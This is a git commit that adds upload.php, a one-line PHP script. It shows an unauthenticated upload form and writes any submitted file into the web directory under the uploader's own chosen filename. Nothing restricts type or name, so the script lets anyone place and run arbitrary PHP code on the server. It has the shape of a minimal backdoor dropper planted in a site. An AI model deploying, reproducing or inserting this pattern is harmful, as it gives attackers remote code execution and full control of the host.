b60628238e7bd9d0df4a8412513fa0a7ad9f6993
ZildanZ <96684361+ZildanZ@users.noreply.github.com>
2025-08-15 09:38:39 +0700

    Add files via upload

---
+++ upload.php
@@ -0,0 +1,2 @@
+
+<?php echo "<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>" . (move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']) ? "Uploaded!" : ""); ?>
